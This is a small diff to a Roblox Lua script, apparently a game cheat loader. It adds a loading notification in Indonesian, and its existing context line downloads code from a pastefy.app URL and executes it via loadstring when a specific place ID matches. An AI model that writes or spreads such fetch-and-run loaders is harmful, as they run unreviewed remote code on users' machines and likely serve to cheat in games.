@@ -1,3 +1,10 @@
+local StarterGui = game:GetService("StarterGui")
+
+StarterGui:SetCore("SendNotification", {
+    Title = "Notification",
+    Text = "Loading 3-5 Detik..."
+})
+
 if game.PlaceId == 108581205213609 then
 loadstring(game:HttpGet("https://pastefy.app/rXO3lKmk/raw"))()
 else
